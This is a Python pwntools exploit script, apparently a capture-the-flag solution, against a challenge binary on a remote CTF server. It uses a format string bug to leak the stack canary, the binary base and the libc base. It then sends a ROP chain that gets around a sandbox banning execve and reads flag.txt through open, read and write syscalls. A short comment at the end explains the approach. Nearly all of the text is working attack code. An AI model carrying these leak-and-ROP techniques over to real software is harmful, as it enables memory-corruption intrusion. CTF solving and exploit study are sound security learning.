#!/usr/bin/python3 

from pwn import *

if args.REMOTE:
    io = remote('challenges.isictf.live', 1203)
else:
    io = process('task_patched')
context.log_level = 'info'

elf = context.binary = ELF('task_patched')
ld = ELF("./ld-2.27.so", checksec=False)

libc = ELF('./libc.so.6')

if args.GDB:
    gdb.attach(io)

def excute(p):
    io.sendlineafter('message:', p)
    res = io.recvline().rstrip().decode()
    return res
    
libc.address = int(excute('%3$p'), 16) - libc.sym._IO_2_1_stdin_#3
canary_value = int(excute('%15$p'), 16)
elf.address  =  int(excute('%17$p'), 16) - 0xc63#17

log.info(f'{hex(canary_value)=}')
log.info(f'{hex(libc.address)=}')
log.info(f'{hex(elf.address)=}')

offset = 72 

flag_string = elf.address + 0x202500  # Just an area to write too
pop_rdi = elf.address + 0xcd3  # pop rdi; ret;
ret = elf.address + 0x8be  # ret; 
syscall_gadget = libc.address + 0xd2625  #0x2743 # syscall; ret;

rop = ROP(elf)
rop.raw(pop_rdi)
rop.raw(flag_string)
rop.gets()
rop.raw(elf.sym.main)

io.sendlineafter(b':', b"A"*offset + p64(canary_value) + b"B"*8 + rop.chain())
io.sendlineafter(b':', b'x')
io.sendline(b"flag.txt\0")

rop = ROP(libc)
#syscall for open
rop(rax=0x2, rdi=flag_string, rsi=0, rdx=0)
rop.raw(syscall_gadget)
#syscall for read
rop(rdi= 6,rax=0,  rsi=flag_string, rdx=0x70)
rop.raw(syscall_gadget)

#syscall for write
rop(rax=1, rdi=1, rsi=flag_string, rdx=0x70)
rop.raw(syscall_gadget)

# rop.raw(ret)
rop.raw(elf.sym.main)

log.info(f'{hex(flag_string)=}')

payload = b'A'*offset
payload += pack(canary_value)
payload += b'b'*8
payload += rop.chain()
# log.info(payload)
io.sendlineafter(b':', payload)
# io.sendlineafter(b':', payload)
io.sendlineafter(b':', b'x')

io.interactive()


'''
the program is vulnerable to format string vulnerability 
we use that to leak some addresses and got some useful values
like (canary, binary base address, and libc base address)
after that we need to do rop
but the problem is there is a sandbox prevent us from calling system or execve
so i took an other approach :
call open and pass flag.txt as parameter
call read to read from the file to a buffer
call write to print the value of the buffer which contain the flag
in c it look like this (psudo code not the exact )

f = open('flag.txt') 
read(3, buffer, f) #3 for the file descriptor
write(buffer)
'''





